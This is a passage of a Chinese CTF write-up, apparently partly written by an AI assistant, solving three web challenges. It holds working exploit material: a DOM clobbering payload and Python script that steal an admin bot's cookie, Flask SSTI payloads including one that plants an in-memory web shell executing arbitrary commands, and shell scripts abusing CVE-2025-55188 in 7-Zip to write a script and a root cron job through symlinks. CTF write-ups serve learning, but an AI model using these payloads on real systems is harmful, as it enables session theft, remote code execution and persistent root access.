    *   代码会检查 `if (auto)`。我们需要 `asBool(window.AUTO_SHARE)` 返回 `true`。
    *   如果我们注入 `<a id="AUTO_SHARE"></a>`，`window.AUTO_SHARE` 就会变成这个 DOM 元素。
    *   HTML 元素在布尔上下文中是 "truthy"（真值）。`asBool` 函数返回 `!!v`，所以结果为 `true`。

2.  **`window.CONFIG_COOKIE_DEBUG`**:
    *   同理，注入 `<a id="CONFIG_COOKIE_DEBUG"></a>` 会让这个变量变为真。
    *   这会导致代码执行 `qs.set('c', document.cookie)`，将 Admin 的 Cookie（其中包含 Flag）添加到请求参数中。

3.  **`window.CONFIG_PATH`**:
    *   代码使用 `buildTarget('/analytics', path)` 计算 fetch 的目标 URL。
    *   `asPath` 函数优先读取 `v.getAttribute('action')`。
    *   我们可以注入一个表单：`<form id="CONFIG_PATH" action="../log"></form>`。
    *   `buildTarget` 函数处理 `..` 的逻辑很简单：
        *   基准路径是 `['analytics']`。
        *   输入的 `action` 是 `../log`，拆分为 `['..', 'log']`。
        *   遇到 `..` 时，它会从栈中弹出 `analytics`。
        *   然后推入 `log`。
        *   最终生成的路径是 `/log`。

**攻击流程总结：**
我们需要构造一个 Payload，迫使 Admin 机器人向 `/log` 接口（这是一个记录请求的公开接口）发送一个请求，并且该请求中包含它的 Cookie（Flag）。

### Exploit Payload (攻击载荷)

创建一个新公告（Post），标题随意，**内容（Content）**填入以下 HTML 代码：

```html
<a id="AUTO_SHARE"></a>
<a id="CONFIG_COOKIE_DEBUG"></a>
<form id="CONFIG_PATH" action="../log"></form>
```

### 自动化解题脚本 (Python)

你可以使用以下脚本自动化攻击过程：

```python
import requests
import time
import json

# 题目地址，请根据实际情况修改
BASE_URL = "http://127.0.0.1:3000"

def solve():
    # 1. 创建恶意帖子
    # 利用 DOM Clobbering 覆盖以下变量:
    # - AUTO_SHARE: 设为真 (触发 fetch 请求)
    # - CONFIG_COOKIE_DEBUG: 设为真 (在请求中附带 cookie/flag)
    # - CONFIG_PATH: 设为 "../log" (将请求目标从 /analytics 修改为 /log)
    payload = """
    <a id="AUTO_SHARE">1</a>
    <a id="CONFIG_COOKIE_DEBUG">1</a>
    <form id="CONFIG_PATH" action="../log"></form>
    """

    print("[*] 正在创建恶意帖子...")
    res = requests.post(f"{BASE_URL}/api/posts", json={
        "title": "Exploit",
        "content": payload
    })
    
    if res.status_code != 200:
        print("[-] 发帖失败")
        return

    post_id = res.json().get("id")
    print(f"[+] 帖子创建成功，ID: {post_id}")

    # 2. 触发 Bot 访问该帖子
    print("[*] 正在触发 Bot...")
    res = requests.get(f"{BASE_URL}/bot", params={"id": post_id})
    print(f"[+] Bot 响应: {res.json()}")

    # 3. 等待 Bot 访问并记录数据
    print("[*] 等待 Bot 访问...")
    time.sleep(3)

    # 4. 检查日志获取 Flag
    print("[*] 正在检查日志...")
    res = requests.get(f"{BASE_URL}/logs")
    logs = res.json().get("logs", [])

    found_flag = False
    for log in logs:
        cookie = log.get("cookie", "")
        # 检查 cookie 中是否包含 flag
        if "flag" in cookie or "FLAG" in cookie:
            print(f"\n[SUCCESS] 在日志中找到 Flag: {cookie}")
            found_flag = True
            break
    
    if not found_flag:
        print("[-] 暂时未在日志中发现 Flag，请重试或手动检查。")

if __name__ == "__main__":
    solve()
```



## 路在脚下

无回显 SSTI

利用：
{% raw %}
```
?name={{config.__class__.__init__.__globals__['os'].popen('env>/tmp/1.txt').read()}}
```
{% endraw %}
将根目录设置为flask静态文件路径：
{% raw %}
```
?name={{x.__init__.__globals__.__getitem__('__builtins__').__getitem__('exec')("setattr(__import__('sys').modules.__getitem__('__main__').__dict__.__getitem__('app'),'_static_folder','/')")}}
```
{% endraw %}
然后访问 /static/tmp/1.txt，得到flag

内存马打法
{% raw %}
```
{{().__class__.__base__.__subclasses__()[104].__init__.__globals__.__builtins__.exec("app = __import__('sys').modules['__main__'].__dict__['app']; rule = app.url_rule_class('/shell', endpoint='shell', methods={'GET'}); app.url_map.add(rule); app.view_functions['shell'] = lambda: __import__('os').popen(__import__('flask').request.args.get('ivory')).read()")}}
```
{% endraw %}


## 77777_time_task

https://github.com/lunbun/CVE-2025-55188/

这道题考察的核心确实是 **CVE-2025-55188**。这是一个针对 7-Zip Linux 版本（p7zip/7zz）的**任意文件写入漏洞**。

简单来说，这个漏洞允许攻击者在解压时，通过精心构造的压缩包，利用**符号链接（Symlink）**绕过目录限制，将文件写入到文件系统中的任意位置（比如 `/etc/cron.d`）。

这两个 Payload 脚本非常精妙，它们展示了如何一步步“欺骗” 7-Zip 来实现**写文件到 `/tmp`** 和 **写文件到 `/etc/cron.d`**。

我来为你逐行拆解这两个 Payload 的逻辑。

---

### 核心原理：7-Zip 如何处理路径？

在旧版本（或特定配置下）的 7-Zip 中，如果压缩包里有类似 `a/b/link` 的文件，且它是一个指向 `/a` 的软链接。当你解压时，7-Zip 会先创建这个软链接。
然后，如果压缩包里还有一个文件路径是 `a/b/link/../../target`，7-Zip 在解压这个文件时，会傻傻地顺着刚才创建的 `link` 走下去，最终变成 `/a/../../target`，从而跳出了原本的解压目录。

### Payload 1：写入执行脚本 (`1.7z`)

这个脚本的目标是：**将恶意 Shell 脚本 (`a.sh`) 写入到 `/tmp/a.sh`**。

```bash
# 1. 创建基础目录结构
mkdir -p c/d

# 2. 创建一个指向根目录 /c 的软链接
# 为什么是 /c ？这其实是一个不存在的目录，但没关系。
# 关键是构建一个“跳板”。
ln -s /c c/d/link

# 3. 将这个软链接打包进 1.7z
# -snl 参数至关重要：它告诉 7z "Store Symbolic Links"（存储符号链接本身，而不是它指向的文件）
7z a 1.7z c/d/link -snl

# --- 此时压缩包里有了：c/d/link -> /c ---

# 4. 构造一个更复杂的链接 "link"
# 这个链接指向 "c/d/link/../../tmp/"
# 这里的逻辑非常绕：
# 当 7z 解压这个 "link" 时，它会试图解析 c/d/link。
# 刚才我们知道 c/d/link 指向 /c。
# 所以 c/d/link/../../tmp/ 实际上解析为： /c/../../tmp/  =>  /tmp/
ln -s c/d/link/../../tmp/ link

# 5. 将这个复杂的链接打包进去
7z a 1.7z link -snl
rm link

# --- 此时压缩包里有了：link -> /tmp/ ---

# 6. 最后的攻击载荷
mkdir link
# 创建我们的恶意脚本：创建 /app/static 目录并把 flag 写进去
echo -e "#\!/bin/sh\nmkdir /app/static\ncat /flag>/app/static/flag.txt" > link/a.sh

# 7. 将恶意脚本打包
# 注意：这里的路径是 link/a.sh。
# 当 7z 解压时，它发现当前目录下已经有了一个叫 "link" 的东西（就是上面第4步解压出来的软链接，指向 /tmp）。
# 于是它就顺着链接把 a.sh 写到了 /tmp/a.sh！
7z a 1.7z link/a.sh
```

**总结 Payload 1 效果**：解压 `1.7z` 后，服务器的 `/tmp/a.sh` 被创建，内容是读取 Flag。

---

### Payload 2：写入 Cron 任务 (`2.7z`)

这个脚本的目标是：**将 Cron 配置文件写入 `/etc/cron.d/task`**，从而触发 Payload 1 中的脚本。

它的逻辑和 Payload 1 几乎一模一样，只是目标路径变了。

```bash
# 1. 创建基础结构
mkdir -p a/b

# 2. 创建跳板链接：linker 指向 /a
ln -s /a a/b/linker
7z a 2.7z a/b/linker -snl

# 3. 构造指向目标的复杂链接
# 逻辑：a/b/linker/../../etc/cron.d/
# 解析：/a/../../etc/cron.d/  =>  /etc/cron.d/
ln -s a/b/linker/../../etc/cron.d/ linker

# 4. 打包这个指向 /etc/cron.d 的链接
7z a 2.7z linker -snl
rm linker

# 5. 最后的攻击载荷
mkdir linker
# 创建 Cron 任务内容
# 每 2 分钟执行一次，root 权限，先给 /tmp/a.sh 加执行权限，然后运行它
echo "*/2 *   * * *   root    chmod +x /tmp/a.sh&&/tmp/a.sh" > linker/task

# 6. 打包
# 7z 解压时看到 linker 是指向 /etc/cron.d 的软链接
# 于是把 task 文件写入到了 /etc/cron.d/task
7z a 2.7z linker/task
```

**总结 Payload 2 效果**：解压 `2.7z` 后，服务器的 `/etc/cron.d/task` 被创建，系统 Cron 服务会读取它并执行 `/tmp/a.sh`。

---

### 为什么之前的攻击失败了？

对比你之前的尝试和这两个 WP 脚本，主要差距在于**对软链接路径解析的利用深度**：

1.  **之前的思路**：简单粗暴地上传一个指向 `/etc/cron.d` 的软链接，然后试图往里写文件。这依赖于简单的解压顺序，但在某些 7z 版本或参数下，如果检测到路径穿越可能会失败。
2.  **WP 的思路（CVE-2025-55188）**：利用了**嵌套的软链接解析**（`c/d/link` -> `/c`，然后利用 `/c/../../target`）。这是一种更底层的路径解析绕过技巧，专门用来欺骗 7-Zip 的安全检查机制，确保能够跳出上传目录。

### 如何利用这两个脚本？

你需要在一台 Linux 机器上保存并运行这两个脚本，生成 `1.7z` 和 `2.7z`。

1.  保存第一个脚本为 `gen_payload1.sh`，运行生成 `1.7z`。
2.  保存第二个脚本为 `gen_payload2.sh`，运行生成 `2.7z`。
3.  按顺序上传：
    *   先上传 `1.7z`（部署恶意脚本到 `/tmp`）。
    *   再上传 `2.7z`（部署触发器到 `/etc/cron.d`）。
4.  等待 2 分钟（Cron 周期）。
5.  Payload 1 的脚本会将 flag 写入 `/app/static/flag.txt`。你需要猜测或扫描是否可以通过 URL 访问这个文件（例如 `http://target:3000/static/flag.txt`），或者再次利用 `/listfiles` 配合 `cp` 命令将其移动到 `uploads` 目录。

*(注意：WP 里的脚本是把 flag 写入 `/app/static`，如果你的题目没有开启 static 路由，记得把 `gen_payload1.sh` 里的路径改成 `/app/uploads/flag.txt`)*

以上方法打不通，看这个 [极客大挑战之77777_time_task做题记录-CSDN博客](https://blog.csdn.net/2403_89184266/article/details/155039829) 反弹shell的打法
